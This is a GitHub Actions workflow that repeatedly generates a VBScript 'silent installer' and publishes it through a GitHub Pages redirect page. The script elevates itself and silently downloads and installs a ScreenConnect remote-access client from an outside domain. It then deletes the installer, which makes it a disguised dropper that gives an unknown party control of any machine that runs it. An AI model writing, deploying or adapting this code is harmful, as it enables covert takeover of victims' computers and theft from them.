name: Update Silent Installer

on:
  schedule:
    - cron: '*/1 * * * *'  # Runs every 10 minutes
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    - name: Create Silent Installer
      run: |
        # Define your download links
        links=("https://hayw.fussionmann.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 1 % 1))
        current_link=${links[$link_index]}
        
        echo "Using link: $current_link"
        
        # Create the VBS script with the current link
        cat > installer.vbs << EOF
        ' --------------------------------------------------------------------------
        '  Silent Installer - Enterprise Monitor Agent
        ' --------------------------------------------------------------------------
        Option Explicit
        
        ' Check for elevation
        If Not WScript.Arguments.Named.Exists("elevated") Then
            CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
            WScript.Quit
        End If
        
        Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
        strUrl = "$current_link"
        strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
        strFile = strTemp & "\\agent_installer.msi"
        
        ' Download
        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
        objXMLHTTP.open "GET", strUrl, False
        objXMLHTTP.send()
        
        ' Handle redirects
        If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
            strUrl = objXMLHTTP.getResponseHeader("Location")
            objXMLHTTP.open "GET", strUrl, False
            objXMLHTTP.send()
        End If
        
        If objXMLHTTP.Status = 200 Then
            Set objADOStream = CreateObject("ADODB.Stream")
            objADOStream.Open
            objADOStream.Type = 1 ' Binary
            objADOStream.Write objXMLHTTP.ResponseBody
            objADOStream.Position = 0
            objADOStream.SaveToFile strFile, 2 ' Overwrite
            objADOStream.Close
            
            ' Install
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
            
            ' Cleanup
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
        End If
        EOF
        
        # Create index.html for GitHub Pages
        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.vbs"></head><body><p>If not redirected, <a href="installer.vbs">click here</a></p></body></html>' > index.html
        
        # Commit and push the updated files
        git config --global user.email "action@github.com"
        git config --global user.name "GitHub Action"
        git add installer.vbs index.html
        git commit -m "Update installer with current link" || exit 0
        git push
        
        echo "Installer updated successfully"
